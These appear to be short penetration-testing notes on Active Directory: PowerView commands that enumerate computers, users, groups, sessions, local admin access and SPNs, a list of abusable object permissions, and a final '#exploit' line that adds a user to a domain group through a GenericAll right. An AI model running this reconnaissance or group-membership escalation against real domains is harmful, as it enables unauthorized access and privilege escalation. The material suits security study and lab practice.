### Enumertaion 
```
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname
Get-NetGroup | select cn
Get-NetUser | select cn,pwdlastset,lastlogon
```

```
Find-LocalAdminAccess
Get-NetSession -ComputerName web04 -Verbose

Get-NetSession -ComputerName client74

Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion

.\PsLoggedon.exe \\files04
```

### SPN
```
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

### Enumerating Object Permissions
```
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```

```
Get-ObjectAcl -Identity <user>
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName

#exploit
net group "Management Department" <user> /add /domain
```
